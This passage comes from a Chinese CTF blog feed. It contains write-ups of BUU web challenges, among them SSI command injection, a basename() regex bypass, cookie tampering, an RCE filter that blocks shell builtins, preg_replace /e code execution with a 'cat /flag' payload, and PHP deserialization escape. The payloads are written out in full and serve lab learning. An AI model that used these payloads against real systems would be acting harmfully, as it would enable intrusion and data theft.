<p>-&gt; 设置HTTP响应头的一种方式，header函数必须在发送任何实际输出（如HTML内容）之前调用，以确保设置的响应头生效,通常在PHP脚本开头</p>
<p><code>mt_rand(0,73)</code></p>
<p>-&gt;使用 Mersenne Twister 算法，在0-73这个范围内随机生成一个整数</p>
<h4 id="3-shtml"><a href="#3-shtml" class="headerlink" title="3.shtml"></a>3.shtml</h4><p>后缀名是.shtml，和html一样都是网页文件。不同在于：</p>
<p>-&gt;shtml文件中有<strong>服务器端包含（server-side includes, SSI）指令</strong></p>
<p>-&gt;shtml文件在发送到客户端前，会经过服务器进行处理 — <strong>将shtml文件中的SSI指令解释</strong></p>
<p>-&gt;最终返回给客户端的是<strong>解释过后的shtml文件内容</strong></p>
<p><strong>SSI指令格式</strong></p>
<p><code>&lt;!--#include virtual=&quot;文件名字&quot;--&gt;</code></p>
<p><code>&lt;!--#include file=&quot;文件名字&quot;--&gt; </code> </p>
<p>-&gt;<code>#include</code>在html文件中引入另一个文件的内容</p>
<p>-&gt; file 是相对于本文档的位置      virtual 是相对于服务器根目录的位置</p>
<p><code>&lt;!--#echo var=&quot;变量名称&quot;--&gt;</code> </p>
<p>-&gt;<code>#echo</code>将 变量或代码 插入到页面中</p>
<p><strong>注意：&lt;!–与#号间无空格，只有SSI指令与参数间存在空格，SSI指令是大小写敏感的。</strong></p>
<p><strong>注意：服务器必须配置为支持SSI功能。SHTML文件可能需要在服务器上启用SSI才能发挥作用。</strong></p>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据题目名 EasySearch 选择用dirsearch扫描目录，不过我自己什么都没扫出来，看Wp说是 index.php.swp，需要自己将这个添加到字典中，才可以扫出来</p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/00.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"></span><br><span class="line">		<span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;    </span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.get_hash函数</p>
<p>-&gt;$chars是大小写字母+数字+一些特殊符号，$random是$chars中五个随机字符，$content是一段唯一字符串+$random</p>
<p>-&gt;返回是经过sha1加密的字符串</p>
<p>2.if else语句可以发现</p>
<p>-&gt;如果满足$admin &#x3D;&#x3D; substr(md5($_POST[‘password’]),0,6) 会进入if语句  否则直接输出 [!] Failed</p>
<p>-&gt;显然要满足 脚本编写（跟Wp写的，自己学习一下）</p>
<p>3.进入if语句之后，会向$shtml中写入$text的内容</p>
</blockquote>
<p>首先要通过脚本找到满足if的条件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>

<p>成功进入</p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/01.png"></p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/02.png"></p>
<p>输出了 [!] Header error …</p>
<p>我们是向一个文件中写入了内容，并且我们了解到了shtml的知识，很明显，我们要找到这个写入内容的shtml文件的目录，从而访问</p>
<p>最后在F12网络中可以找到</p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/03.png"></p>
<p>访问之后</p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/04.png" alt="04"></p>
<p>得到$username就是我们的执行点 再根据shtml的知识，通过SSI指令来控制内容</p>
<p><code>&lt;!--#exec cmd=&quot;ls&quot;-&gt;</code></p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/05.png"></p>
<p>查看当前目录并没有什么收获，但我们当前目录是 public 所以我们查看上一级目录</p>
<p><code>&lt;!--#exec cmd=&quot;ls ../&quot;-&gt;</code></p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/06.png"></p>
<p>直接访问</p>
<p><img src="/CTF/Web/BUU-%5BBJDCTF2020%5DEasySearch/07.png"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU平台的Web题记录</title>
    <url>/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>知识点：</p>
<ul>
<li>basenmae()函数的问题</li>
<li>正则匹配的绕过</li>
<li>代码审计</li>
<li>PHP预定义的超全局变量</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">hash_equals</span>(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$_SERVER[&#39;PHP_SELF&#39;]</code></p>
<p> -&gt; 获取当前正在执行的脚本的路径中的名字</p>
<p><code>preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])</code></p>
<p>-&gt; 正则匹配中 <code>./</code>有特殊含义，用<code>\</code> 来转义   </p>
<p>&#x3D;&gt; 如果当前目录的最后的脚本的名字是以 <code>config.php/</code>就会匹配成功 返回True</p>
<p><strong>思路：</strong></p>
<p>源码中给出了 Flag在config.php，所以我们绕过这个正在匹配，来高亮显示config.php文件 读取flag</p>
<p>这个源码中下半部分是 </p>
<p>-&gt; 64位二进制随机数转换成十六进制 后与 POST方法传入的参数  hash值比较</p>
<p>-&gt; 不知道从这个角度能否下手。</p>
<p><strong>还是绕过正则：</strong></p>
<p>这里 <code>basename()</code>函数存在一个问题 &#x3D;&gt; 它会去掉文件名开头中的非ASCII码值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">basename</span>(<span class="string">&quot;%feconfig.php&quot;</span>)); <span class="comment">// 随便非ASCII码值就可以</span></span><br></pre></td></tr></table></figure>

<p>payload:<code>/index.php/config.php/%fe?source</code></p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>初始是50元，先购买前面的 看看有什么信息（根据题目Cookie），通过抓包，发现Cookie是经过base64加密的 且是有一定的格式的。</p>
<p>我是通过抓包修改Cookie，让剩余的钱数变成大于100后放包，直接买flag的商品</p>
<p><code>&#123;&quot;money&quot;: 150, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</code></p>
<p>-&gt;这是Cookie的格式，钱数就是 买完之后还有多少钱</p>
<p>-&gt; history指的是 你的购买记录</p>
<p>&#x3D;&gt; 抓包修改 money 放包</p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>这个题看Wp说有源码泄露</p>
<ul>
<li><input disabled type="checkbox"> 代码审计</li>
<li><input disabled type="checkbox"> preg_match()函数的理解</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"><span class="comment"># 这行代码是用来在运行中的shell环境中修改环境变量的. =&gt; 这行代码将PATH环境变量设置为 /home/rceserivice/jail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">is_string</span>(<span class="variable">$json</span>)) &#123;	<span class="comment"># 检查$json变量是不是一个字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>环境变量的概念：</p>
<p>操作系统用来存储关于系统运行时信息的数据，这些信息可以被操作系统和执行的程序访问。PATH环境变量特别用于查找执行文件（例如程序或脚本）的位置。<strong>当你在Shell中输入一个命令时，操作系统会依次检查PATH变量中列出的目录，直到找到对应的执行文件。</strong></p>
</blockquote>
<p>法1： 用换行符（%0A）绕过正则匹配：</p>
<p>&#96;?cmd&#x3D;</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-ZJCTF,不过如此 - Wp</title>
    <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
    <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.使用php:&#x2F;&#x2F;input</p>
<p><strong>php:&#x2F;&#x2F;input</strong>可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。<strong>当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</strong></p>
<p><strong>遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。</strong></p>
</blockquote>
<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/01.png" alt="01"></p>
<blockquote>
<p>2.使用data协议</p>
<p>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，<strong>当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行</strong></p>
</blockquote>
<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/02.png" alt="02"></p>
<p>next.php的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>1.preg_replace()的&#x2F;e模式存在命令执行漏洞		&#x2F;e -&gt; 可执行模式，此为PHP专有参数，例如preg_replace函数.</strong></p>
<p><strong>知识学习</strong>（低版本php存在，新版本的php已经启用&#x2F;e）</p>
<p><a href="https://xz.aliyun.com/t/2557">https://xz.aliyun.com/t/2557</a></p>
<p><a href="https://blog.csdn.net/qq_20408491/article/details/75095055">https://blog.csdn.net/qq_20408491/article/details/75095055</a></p>
<blockquote>
<p> <strong>preg_replace</strong> 函数在匹配到符号正则的字符串时，会将替换字符串（也就是上图 <strong>preg_replace</strong> 函数的第二个参数）当做代码来执行，然而这里的第二个参数却固定为 <strong>‘strtolower(“\1”)’</strong> 字符串，那这样要如何执行代码呢？</p>
<p><strong>replacement</strong>可以包含\n形式或$n形式的逆向引用，n可以为0到99，\n表示匹配pattern第n个子模式的文本，\0表示匹配整个pattern的文本</p>
</blockquote>
<p><strong><code>\1</code> 在正则表达式中有自己的含义，</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反向引用</span><br><span class="line"></span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数</span><br><span class="line"></span><br><span class="line">这里的 \1 实际上是匹配第一个子匹配项,我们拿 ripstech 官方给的 payload 进行分析，方便大家理解。官方 payload 为： /?.*=&#123;$&#123;phpinfo()&#125;&#125; ，即 GET 方式传入的参数名为 /?.* ，值为 &#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原先的语句： preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, $str);</span><br><span class="line">变成了语句： preg_replace(&#x27;/(.*)/ei&#x27;, &#x27;strtolower(&quot;\\1&quot;)&#x27;, &#123;$&#123;phpinfo()&#125;&#125;);</span><br></pre></td></tr></table></figure>

<p><strong>2.此处由GET方法传入值，而GET方法传参时 -&gt; 当首字母为点号时，会被替换为下划线.</strong></p>
<blockquote>
<p><strong>\S*&#x3D;${phpinfo()}</strong></p>
<p>\S 匹配任何非空白字符</p>
</blockquote>
<p><strong>3.PHP可变变量</strong></p>
<p><code>payload \S\*=$&#123;phpinfo()&#125;</code></p>
<blockquote>
<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
</blockquote>
<p>payload: <code>/?text=data://text/pain,I have a dream&amp;file=next.php&amp;\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Buu</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-easy_serialize_php的Wp</title>
    <url>/CTF/Web/BUU-easy_serialize_php/</url>
    <content><![CDATA[<blockquote>
<p>1.代码审计</p>
<p>2.PHP反序列化</p>
<p>3.反序列化中的对象逃逸</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
</blockquote>
<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>

<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
<hr>
<p><strong>如何去构造一个字符串逃逸</strong></p>
<hr>
<p><strong>1.键名逃逸</strong></p>
<p>如何传入$_SESSION[phpflag] 序列化之后</p>
<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>结合起来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// 